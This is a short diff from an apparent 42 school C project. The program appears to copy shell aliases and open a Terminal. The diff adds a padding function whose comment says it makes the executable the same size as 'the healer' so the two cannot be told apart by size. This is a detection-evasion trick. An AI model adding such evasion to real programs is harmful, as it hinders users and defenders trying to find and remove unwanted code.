@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
-/*   Updated: 2023/08/31 11:36:17 by mgama            ###   ########.fr       */
+/*   Updated: 2023/08/31 11:39:41 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,10 @@
 
 #define FAKE_SIZE_LENGTH 5000
 
-int	fake_exec_size()
+/**
+ *	Increasing size of the executable so it equals the healer, so they can't be found by size
+ */
+int	fake_exec_size(void)
 {
 	char	dummy[FAKE_SIZE_LENGTH];
 	int		i;
@@ -67,6 +70,7 @@ int	main(int ac, char **av, char **envp)
 	char	*osxterm_cmd[] = {"open", "-a", "Terminal", NULL};
 
 	(void)(ac);
+	fake_exec_size();
 	realpath(av[0], home_buffer);
 	printf("currrent file path = %s\n", home_buffer);
 	copy_alias(envp);
